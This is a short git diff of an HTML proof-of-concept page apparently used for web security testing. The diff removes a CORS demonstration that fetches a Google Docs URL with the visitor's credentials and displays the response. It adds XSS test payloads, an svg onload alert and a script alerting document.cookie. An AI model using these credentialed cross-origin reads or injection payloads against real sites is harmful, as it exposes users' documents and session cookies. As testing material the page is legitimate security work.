@@ -6,18 +6,10 @@
     <title></title>
 </head>
 <body>
-    <h3>CORS POC</h3>
+    <h3>This is the testing page of c1ph3rxxx</h3>
     <center> <div id="poc"></div></center>
-    <script type="text/javascript">
-        const request = new XMLHttpRequest()
-        request.open("get", "https://docs.google.com/document/u/0/d/1Hxy7TrSBg4kJQW9OHT-giJNIEL7xcurNOLuYPGI5hyo/?pli=1", true)
-        request.onload = ()=>{
-            // window.location.href = "/res?key=" + request.responseText
-            document.getElementById('poc').innerHTML= request.responseText;
-        }
-        request.withCredentials = true
-        request.send()
-    </script>
+       
     <svg onload=alert(document.domain)>
+    <script>alert(document.cookie)</script>
 </body>
 </html>
